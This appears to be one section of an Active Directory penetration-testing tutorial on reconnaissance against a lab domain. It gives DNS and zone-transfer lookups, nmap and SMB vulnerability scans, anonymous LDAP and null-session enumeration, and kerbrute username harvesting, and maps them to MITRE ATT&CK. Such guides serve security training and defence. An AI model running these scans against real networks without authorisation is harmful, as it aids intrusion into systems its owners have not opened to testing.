# 🔍 Phase 1: Reconnaissance

Reconnaissance is the first step — gathering information about the target AD environment **before** obtaining any credentials.

---

## 1.1 External Reconnaissance (OSINT)

```bash
# Discover domain information via DNS
nslookup -type=SRV _ldap._tcp.corp.local
nslookup -type=SRV _kerberos._tcp.corp.local

# Zone transfer attempt
dig axfr corp.local @192.168.56.10

# Find domain controllers
nslookup -type=SRV _ldap._tcp.dc._msdcs.corp.local
```

## 1.2 Network Scanning

```bash
# Discover live hosts
nmap -sn 192.168.56.0/24

# Full port scan on DC
nmap -sV -sC -p- 192.168.56.10 -oN dc01_scan.txt

# SMB enumeration
nmap --script smb-enum-shares,smb-enum-users -p 445 192.168.56.10
nmap --script smb-vuln* -p 445 192.168.56.10
```

## 1.3 LDAP Enumeration (Anonymous)

```bash
# Anonymous LDAP bind
ldapsearch -x -H ldap://192.168.56.10 -b "DC=corp,DC=local"

# Enumerate domain users
ldapsearch -x -H ldap://192.168.56.10 -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName

# Enumerate groups
ldapsearch -x -H ldap://192.168.56.10 -b "DC=corp,DC=local" "(objectClass=group)" cn
```

## 1.4 SMB Null Session

```bash
# Check for null sessions
crackmapexec smb 192.168.56.10 -u '' -p ''
crackmapexec smb 192.168.56.10 -u 'guest' -p ''

# Enum4linux
enum4linux -a 192.168.56.10
```

## 1.5 Username Harvesting with Kerbrute

```bash
# Username enumeration via Kerberos (no credentials needed!)
kerbrute userenum --dc 192.168.56.10 -d corp.local /usr/share/wordlists/usernames.txt
```

---

## MITRE ATT&CK Mapping

| Technique | ID | Description |
|-----------|-----|-------------|
| Active Scanning | T1595 | Nmap, port scanning |
| Network Service Discovery | T1046 | SMB, LDAP enumeration |
| Account Discovery | T1087.002 | AD user enumeration |
